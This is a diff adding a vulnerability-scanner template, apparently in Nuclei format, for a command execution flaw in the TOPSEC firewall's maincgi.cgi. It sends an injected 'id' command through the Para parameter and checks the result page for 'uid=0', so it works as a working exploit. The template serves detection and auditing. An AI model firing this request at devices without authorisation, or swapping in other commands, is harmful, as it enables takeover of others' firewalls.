@@ -1,0 +1,47 @@
+id: topsec-firewall-maincgi-rce
+
+info:
+  name: TOPSEC Firewall maincgi.cgi RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Hackers can directly execute commands to gain system permissions and take over the device, causing severe damage.
+  tags: rce
+  metadata:
+    product: TOPSEC-Firewall
+    disclosure_date: 2021-06-02
+
+variables:
+  command: "id"
+
+flow: http(1) && http(2)
+
+http:
+  - id: execute-command
+    method: GET
+    path:
+      - "/cgi/maincgi.cgi?Url=Command&Action=id&Para={{command}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    stop-at-first-match: true
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: check-result
+    method: GET
+    path:
+      - "/cgi/maincgi.cgi?Url=CommandResult"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid=0"
+          - "msgget2 error"
+      - type: status
+        status:
+          - 200
